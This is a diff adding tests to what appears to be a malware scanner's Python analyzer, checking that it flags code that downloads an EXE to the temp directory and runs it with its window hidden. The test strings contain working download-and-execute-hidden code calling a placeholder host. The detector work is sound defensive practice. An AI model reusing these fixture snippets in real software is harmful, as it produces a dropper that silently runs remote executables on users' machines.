@@ -629,3 +629,47 @@ class TestDataCarriedInDnsNames:
             "socket.gethostbyname('api.example.invalid')\n"
         )
         assert self.tunnel(source) == []
+
+
+class TestADownloadedProgramStartedHidden:
+    """Group D: fetch_data_api_syncapi 0.1.1 downloads an EXE to the temp directory and starts it
+    with its window hidden. The downloaded-and-run detail carries ` hidden=1`."""
+
+    @staticmethod
+    def runs(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if "downloaded" in h.detail]
+
+    FETCH = (
+        "import os, subprocess, tempfile, urllib.request\n"
+        "def fetch():\n"
+        "    path = os.path.join(tempfile.gettempdir(), 'u.exe')\n"
+        "    urllib.request.urlretrieve('https://example.invalid/u.exe', path)\n"
+    )
+
+    def test_started_with_a_hidden_window(self):
+        source = self.FETCH + (
+            "    si = subprocess.STARTUPINFO()\n"
+            "    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n"
+            "    si.wShowWindow = 0\n"
+            "    subprocess.Popen([path], startupinfo=si)\n"
+        )
+        assert self.runs(source) == ["subprocess.Popen runs a downloaded file hidden=1"]
+
+    def test_started_with_no_window_flag(self):
+        source = self.FETCH + (
+            "    subprocess.Popen([path], creationflags=subprocess.CREATE_NO_WINDOW)\n"
+        )
+        assert self.runs(source) == ["subprocess.Popen runs a downloaded file hidden=1"]
+
+    def test_started_with_its_window_is_not_hidden(self):
+        source = self.FETCH + "    subprocess.Popen([path])\n"
+        assert self.runs(source) == ["subprocess.Popen runs a downloaded file"]
+
+    def test_a_hiding_flag_in_another_function_does_not_count(self):
+        source = self.FETCH + (
+            "    subprocess.Popen([path], startupinfo=make())\n"
+            "def other():\n"
+            "    si = subprocess.STARTUPINFO()\n"
+            "    si.wShowWindow = 0\n"
+        )
+        assert self.runs(source) == ["subprocess.Popen runs a downloaded file"]
